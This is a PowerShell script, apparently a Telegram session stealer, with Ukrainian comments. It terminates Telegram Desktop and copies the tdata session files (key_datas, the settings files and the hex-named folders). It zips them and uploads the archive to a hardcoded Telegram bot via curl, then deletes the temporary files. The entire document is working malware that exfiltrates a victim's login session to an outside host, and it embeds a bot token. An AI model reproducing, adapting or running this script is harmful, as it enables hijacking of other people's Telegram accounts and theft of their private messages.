taskkill /f /im Telegram.exe

$tdata = "$env:APPDATA\Telegram Desktop\tdata"
if (!(Test-Path $tdata)) { exit }

$d = "$env:TMP\t"
New-Item $d -ItemType Directory -Force | Out-Null

# Фіксовані файли
$fixed = @("key_datas", "settings0", "settings1")
foreach ($name in $fixed) {
    $src = Join-Path $tdata $name
    if (Test-Path $src) {
        Copy-Item $src $d -Recurse -Force
    }
}

# Усі HEX-подібні назви довжиною 16 (великі літери/цифри)
Get-ChildItem $tdata -Force | Where-Object {
    $_.Name -match '^[0-9A-F]{16}$'
} | ForEach-Object {
    Copy-Item $_.FullName $d -Recurse -Force
}

$z = "$env:TMP\t.zip"
Compress-Archive "$d\*" $z -Force
Remove-Item $d -Recurse -Force

curl.exe -F "chat_id=8115479934" -F "document=@$z" "https://api.telegram.org/bot8896140664:AAG3GYY_qygOReI-JTOisou02Lfj3NdavQo/sendDocument"

Remove-Item $z -Force
exit
